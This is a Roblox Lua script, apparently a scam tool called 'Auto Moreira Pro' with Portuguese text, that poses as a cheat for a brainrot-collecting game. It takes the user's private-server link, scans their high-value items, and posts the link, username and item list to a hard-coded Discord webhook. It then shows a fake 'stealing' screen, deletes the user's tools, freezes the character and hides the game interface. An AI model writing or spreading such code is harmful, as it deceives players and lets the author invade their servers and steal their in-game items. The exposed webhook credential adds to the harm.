local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1461925133399883925/VA2tYwwfHRJQITOppje5uuk-X78zAHt5a44mE39C1HYo2n0qG_6zH_TSTaP2SqM1IE4b"
local Min_Gen = 1_000_000

local locaisDaMusica = {
game.Workspace,
game.SoundService,
}

local nomesMusicasComuns = {
"music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
}

local function eMusica(som)
if not (som:IsA("Sound")) then
return false
end

local nomeMinusculo = som.Name:lower()  
for _, palavra in pairs(nomesMusicasComuns) do  
    if nomeMinusculo:find(palavra) then  
        return true  
    end  
end  
  
for _, local_ in pairs(locaisDaMusica) do  
    if som:IsDescendantOf(local_) and som.Parent == local_ then  
        if som.Looped and som.TimeLength > 30 then  
            return true  
        end  
    end  
end  
  
return false

end

local function processarSom(som)
if som:IsA("Sound") then
if not eMusica(som) then
som.Volume = 0
end
elseif som:IsA("SoundGroup") then
som.Volume = 0
end
end

-- Silenciar sons existentes (otimizado)
task.spawn(function()
for _, descendente in pairs(game:GetDescendants()) do
processarSom(descendente)
end
end)

-- Silenciar sons novos
game.DescendantAdded:Connect(function(descendente)
task.wait()
processarSom(descendente)
end)

local function formatNumberShort(n)
if not n or type(n) ~= "number" then return "$0" end
if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
if n >= 1e6 then return string.format("$%.1fM", n/1e6):gsub("%.0M","M") end
if n >= 1e3 then return string.format("$%.1fK", n/1e3):gsub("%.0K","K") end
return "$"..tostring(n)
end

local function parseValueFromText(s)
if not s then return 0 end
local num = s:match("([%d%.]+)")
if not num then return 0 end
local n = tonumber(num) or 0
if s:find("B") then return n1e9
elseif s:find("M") then return n1e6
elseif s:find("K") then return n*1e3
else return n end
end

-- â–¼ FunÃ§Ã£o: BUSCAR BRAINROTS (otimizado)
local function getBrainrots()
local results = {}
local plots = Workspace:FindFirstChild("Plots") or Workspace

for _, plot in ipairs(plots:GetChildren()) do  
    local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")  
    if podiums then  
        for _, pd in ipairs(podiums:GetChildren()) do  
            local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")  
            local spawn = base and base:FindFirstChild("Spawn")  
            local att = spawn and spawn:FindFirstChild("Attachment")  
            local oh = att and att:FindFirstChild("AnimalOverhead")  
            local nameLbl = oh and oh:FindFirstChild("DisplayName")  
            local genLbl = oh and oh:FindFirstChild("Generation")  
              
            if nameLbl and nameLbl:IsA("TextLabel") then  
                local name = nameLbl.Text  
                local genText = genLbl and genLbl.Text or "0"  
                local valueNum = parseValueFromText(genText)  
                  
                if valueNum >= Min_Gen then  
                    local key = name.."|"..valueNum  
                    if results[key] then  
                        results[key].count += 1  
                    else  
                        results[key] = {name=name, value=valueNum, count=1}  
                    end  
                end  
            end  
        end  
    end  
end  
  
local out = {}  
for _, v in pairs(results) do table.insert(out, v) end  
table.sort(out, function(a,b) return a.value > b.value end)  
return out

end

-- â–¼ FunÃ§Ã£o: validar URL
local function isValidUrl(str)
if type(str) ~= "string" or str == "" then return false end
return str:match("^https?://") and str:find(".", 1, true) and #str > 10
end

-- â–¼ FunÃ§Ã£o: obter nÃºmero de jogadores
local function getPlayersCount()
return #Players:GetPlayers()
end

-- â–¼ FunÃ§Ã£o: ENVIAR PARA DISCORD COM BRAINROTS
local function sendToDiscord(link, playerCount, playerName, brainrots)
task.spawn(function()
local brainrotText = ""
if #brainrots > 0 then
brainrotText = "\n\nBrainrots Encontrados:\n"
for i, br in ipairs(brainrots) do
if i > 10 then break end
local formattedValue = formatNumberShort(br.value)
brainrotText = brainrotText .. string.format("%d. %s - %s (x%d)\n",
i, br.name, formattedValue, br.count)
end
brainrotText = brainrotText .. string.format("\nTotal: %d brainrots de alto valor", #brainrots)
else
brainrotText = "\n\nâš ï¸ Nenhum brainrot de alto valor encontrado"
end

local data = HttpService:JSONEncode({  
        content = "@everyone",  
        embeds = {{  
            title = "[By Dev - wendel ]ðŸ”¥ Novo Server Privado Detectado",  
            description = "**Link:**\n" .. link ..   
                          "\n\n**ðŸ‘¤ Jogador:** `" .. playerName .. "`" ..  
                          "\n**ðŸ‘¥ Players no server:** `" .. playerCount .. "`" ..  
                          brainrotText,  
            color = #brainrots > 0 and 3066993 or 15158332,  
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),  
            footer = { text = "Auto Moreira â€¢ Min: " .. formatNumberShort(Min_Gen) }  
        }}  
    })  
      
    print("[WENDEL] Enviando dados para webhook...")  
      
    local success, res = pcall(function()  
        return HttpService:PostAsync(  
            WEBHOOK_URL,   
            data,   
            Enum.HttpContentType.ApplicationJson,  
            false,  
            {["Content-Type"] = "application/json"}  
        )  
    end)  
      
    if not success then  
        warn("[WENDEL] Erro no envio:", res)  
        local altSuccess = pcall(function()  
            return request({  
                Url = WEBHOOK_URL,  
                Method = "POST",  
                Headers = {["Content-Type"] = "application/json"},  
                Body = data  
            })  
        end)  
        if altSuccess then  
            print("[WENDEL] Enviado via mÃ©todo alternativo!")  
        end  
    else  
        print("[WENDEL] Dados enviados com sucesso!")  
    end  
end)

end

-- â–¼ FunÃ§Ã£o: TELA DE SCAN OTIMIZADA
local function showScanScreen(brainrots)
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local scanGui = Instance.new("ScreenGui")  
scanGui.Name = "ScanScreen"  
scanGui.ResetOnSpawn = false  
scanGui.DisplayOrder = 999  
scanGui.IgnoreGuiInset = true  
  
local blackBg = Instance.new("Frame")  
blackBg.Size = UDim2.new(1, 0, 1, 0)  
blackBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
blackBg.BorderSizePixel = 0  
blackBg.Parent = scanGui  
  
local mainText = Instance.new("TextLabel")  
mainText.Size = UDim2.new(0.9, 0, 0, 80)  
mainText.Position = UDim2.new(0.05, 0, 0.5, -40)  
mainText.BackgroundTransparency = 1  
mainText.Text = "Carregando Auto Moreira..."  
mainText.TextColor3 = Color3.fromRGB(0, 255, 0)  
mainText.Font = Enum.Font.Code  
mainText.TextSize = 24  
mainText.TextWrapped = true  
mainText.TextScaled = true  
mainText.Parent = blackBg  
  
local textSize = Instance.new("UITextSizeConstraint")  
textSize.MaxTextSize = 28  
textSize.MinTextSize = 16  
textSize.Parent = mainText  
  
scanGui.Parent = playerGui  
  
local statusVariations = {  
    "Status: lÃ¡ grande combinasion",  
    "Status: Los combinado",  
    "Status: espaguete toalete",  
    "Status: lÃ¡ grande Gold",  
    "Status: lÃ¡ spooky",  
    "Status: lÃ¡ cucaracha",  
    "Status: Chicleteira",  
    "Status: quesadila vampiro",  
    "Status: lÃ¡ grande combinaÃ§Ãµes diamond",  
    "Status: lÃ¡ grande extinÃ§Ã£o"  
}  
  
task.spawn(function()  
    while scanGui.Parent do  
        mainText.Text = "Carregando Auto Moreira (aguarde 10s)..."  
        task.wait(10)  
          
        mainText.Text = "Convidando vÃ­timas aguarde..."  
        task.wait(10)  
          
        for repetir = 1, 2 do  
            mainText.Text = "VÃ­tima encontrado"  
            task.wait(8)  
              
            mainText.Text = "Status: nÃ£o possui nenhum Brainrot de valor"  
            task.wait(10)  
              
            mainText.Text = "Banindo......"  
            task.wait(10)  
        end  
          
        mainText.Text = "VÃ­tima encontrado"  
        task.wait(8)  
          
        local randomStatus = statusVariations[math.random(1, #statusVariations)]  
        mainText.Text = randomStatus  
        task.wait(12)  
          
        mainText.Text = "Roubando....."  
        task.wait(12)  
          
        mainText.Text = "Roubo concluÃ­do"  
        task.wait(10)  
    end  
end)

end

local function trapPlayer()
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

task.spawn(function()  
    local backpack = player:FindFirstChild("Backpack")  
    if backpack then  
        for _, tool in pairs(backpack:GetChildren()) do  
            if tool:IsA("Tool") then tool:Destroy() end  
        end  
    end  
    for _, tool in pairs(char:GetChildren()) do  
        if tool:IsA("Tool") then tool:Destroy() end  
    end  
    print("[WENDEL] Hotbar limpa!")  
end)  
  
task.spawn(function()  
    local humanoid = char:FindFirstChild("Humanoid")  
    if humanoid then  
        humanoid.WalkSpeed = 0  
        humanoid.JumpPower = 0  
        humanoid.JumpHeight = 0  
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)  
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)  
        print("[WENDEL] Movimento bloqueado!")  
    end  
      
    local hrp = char:FindFirstChild("HumanoidRootPart")  
    if hrp then hrp.Anchored = true end  
end)  
  
task.spawn(function()  
    local StarterGui = game:GetService("StarterGui")  
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)  
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)  
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)  
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)  
    print("[WENDEL] UI ocultada!")  
end)

end

-- â–¼ CRIAR MENU UI OTIMIZADO (PlayerGui)
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local menu = Instance.new("ScreenGui")
menu.Name = "AutoMoreiraMenu"
menu.ResetOnSpawn = false
menu.DisplayOrder = 100
menu.IgnoreGuiInset = true

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
frame.BorderSizePixel = 0
frame.Parent = menu

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = frame

local frameShadow = Instance.new("UIStroke")
frameShadow.Color = Color3.fromRGB(80, 120, 255)
frameShadow.Thickness = 2
frameShadow.Transparency = 0.3
frameShadow.Parent = frame

-- Header compacto
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
header.BorderSizePixel = 0
header.Parent = frame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 12)
headerFix.Position = UDim2.new(0, 0, 1, -12)
headerFix.BackgroundColor3 = Color3.fromRGB(60, 100, 220)
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "ðŸ”— Auto Moreira Pro"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

-- DescriÃ§Ã£o
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -30, 0, 30)
desc.Position = UDim2.new(0, 15, 0, 60)
desc.BackgroundTransparency = 1
desc.Text = "Cole o link do servidor privado:"
desc.TextColor3 = Color3.fromRGB(180, 180, 200)
desc.Font = Enum.Font.Gotham
desc.TextSize = 13
desc.TextXAlignment = Enum.TextXAlignment.Left
desc.Parent = frame

-- Input container
local inputBox = Instance.new("Frame")
inputBox.Size = UDim2.new(1, -30, 0, 45)
inputBox.Position = UDim2.new(0, 15, 0, 100)
inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
inputBox.BorderSizePixel = 0
inputBox.Parent = frame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = inputBox

local inputStroke = Instance.new("UIStroke")
inputStroke.Color = Color3.fromRGB(50, 50, 70)
inputStroke.Thickness = 1
inputStroke.Parent = inputBox

local input = Instance.new("TextBox")
input.Size = UDim2.new(1, -16, 1, 0)
input.Position = UDim2.new(0, 8, 0, 0)
input.BackgroundTransparency = 1
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.Font = Enum.Font.Gotham
input.TextSize = 13
input.PlaceholderText = "https://roblox.com/share?code=..."
input.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
input.ClearTextOnFocus = false
input.TextXAlignment = Enum.TextXAlignment.Left
input.Parent = inputBox

-- BotÃ£o
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -30, 0, 45)
btn.Position = UDim2.new(0, 15, 0, 165)
btn.BackgroundColor3 = Color3.fromRGB(60, 120, 240)
btn.Text = "ENVIAR LINK"
btn.Font = Enum.Font.GothamBold
btn.TextSize = 15
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.AutoButtonColor = false
btn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btn

-- Footer info
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -25)
footer.BackgroundTransparency = 1
footer.Text = "Min: " .. formatNumberShort(Min_Gen) .. " â€¢ Delta Compatible"
footer.TextColor3 = Color3.fromRGB(120, 120, 140)
footer.Font = Enum.Font.Gotham
footer.TextSize = 11
footer.Parent = frame

-- AnimaÃ§Ãµes leves
btn.MouseButton1Click:Connect(function()
local link = input.Text:gsub("^%s*(.-)%s*$", "%1")

if link == "" then  
    input.Text = ""  
    input.PlaceholderText = "âŒ Cole um link primeiro!"  
    inputStroke.Color = Color3.fromRGB(255, 80, 80)  
    task.wait(2)  
    input.PlaceholderText = "https://roblox.com/share?code=..."  
    inputStroke.Color = Color3.fromRGB(50, 50, 70)  
    return  
end  

if not isValidUrl(link) then  
    input.Text = ""  
    input.PlaceholderText = "âŒ Link invÃ¡lido!"  
    inputStroke.Color = Color3.fromRGB(255, 80, 80)  
    task.wait(2)  
    input.PlaceholderText = "https://roblox.com/share?code=..."  
    inputStroke.Color = Color3.fromRGB(50, 50, 70)  
    return  
end  

btn.Text = "[WENDEL] PROCESSANDO..."  
btn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)  
  
local playerName = Players.LocalPlayer.Name  
local playerCount = getPlayersCount()  
  
print("[WENDEL] Procurando brainrots...")  
local brainrots = getBrainrots()  
print("[WENDEL] Encontrados: " .. #brainrots .. " brainrots")  
  
sendToDiscord(link, playerCount, playerName, brainrots)  
  
task.wait(0.5)  
  
menu:Destroy()  
showScanScreen(brainrots)  
task.wait(2)  
trapPlayer()  

print("[WENDEL] Sistema ativado!")  
print("[WENDEL] Jogador: " .. playerName)  
print("[WENDEL] Players: " .. playerCount)  
print("[WENDEL] Brainrots: " .. #brainrots)  
print("[WENDEL] Link: " .. link)

end)

input.Focused:Connect(function()
inputStroke.Color = Color3.fromRGB(80, 140, 255)
inputStroke.Thickness = 2
end)

input.FocusLost:Connect(function()
inputStroke.Color = Color3.fromRGB(50, 50, 70)
inputStroke.Thickness = 1
end)

menu.Parent = playerGui

print("Made by Dev - wendel!")
